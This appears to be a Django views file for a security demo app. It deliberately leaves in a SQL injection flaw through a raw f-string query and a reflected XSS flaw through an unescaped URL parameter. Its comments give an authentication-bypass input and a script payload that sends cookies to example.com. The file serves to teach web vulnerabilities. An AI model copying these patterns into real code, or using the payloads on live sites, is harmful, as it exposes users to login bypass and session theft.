from django.contrib.auth.models import User
from django.http import HttpResponse
from django.shortcuts import render
from django.urls import reverse


def index(request):
    return render(request, "demoapp/index.html")


def injection(request):
    # Use this as password: ' OR '1' = '1
    authenticated = False
    if request.method == "POST":
        username = request.POST.get("username")
        password = request.POST.get("password")
        user = User.objects.raw(f"""
            SELECT * FROM auth_user
            WHERE username = '{username}' AND password = '{password}'
        """)
        # Yeah, I know password is not stored as plaintext and we should compare the hash.
        # But, this is just a demo! :)
        if user:
            authenticated = True
    return render(request, "demoapp/injection.html", {
        "authenticated": authenticated
    })


def xss(request):
    # Try this:
    # ?cc="/><script>document.location=%27https://example.com?foo=%27%20%2B%20document.cookie</script><br%20class="
    cc = request.GET.get("cc", "")
    return HttpResponse(
        f"""
            <h1>XSS Demo</h1>
            <p>
                Everything you put in "cc" parameter in URL,
                will be set as the "value" of following input without any escaping.
            </p>
            <p>
                <input name="creditcard" type="text" value="{cc}">
            </p>
            <a href="{reverse("index")}">Back to Index</a>
        """
    )
